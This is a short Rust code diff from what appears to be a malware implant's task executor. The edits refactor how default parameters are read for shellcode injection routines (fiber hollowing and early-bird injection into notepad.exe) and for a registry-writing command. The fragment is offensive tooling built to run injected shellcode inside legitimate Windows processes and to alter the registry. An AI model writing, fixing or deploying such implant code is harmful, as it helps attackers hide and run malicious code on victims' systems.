@@ -403,7 +403,8 @@ impl TaskExecutor {
             let target_process = task_data
                 .parameters
                 .get("target_process")
-                .unwrap_or(&"C:\\Windows\\System32\\notepad.exe".to_string());
+                .map(String::as_str)
+                .unwrap_or("C:\\Windows\\System32\\notepad.exe");
 
             self.fiber_executor
                 .execute_fiber_hollowing(shellcode_b64, target_process)
@@ -426,7 +427,8 @@ impl TaskExecutor {
             let target_process = task_data
                 .parameters
                 .get("target_process")
-                .unwrap_or(&"C:\\Windows\\System32\\notepad.exe".to_string());
+                .map(String::as_str)
+                .unwrap_or("C:\\Windows\\System32\\notepad.exe");
 
             self.fiber_executor
                 .execute_early_bird_fiber(shellcode_b64, target_process)
@@ -484,7 +486,8 @@ impl TaskExecutor {
         let value_type = task_data
             .parameters
             .get("value_type")
-            .unwrap_or(&"REG_SZ".to_string());
+            .map(String::as_str)
+            .unwrap_or("REG_SZ");
 
         let output = Command::new("reg")
             .args(&[
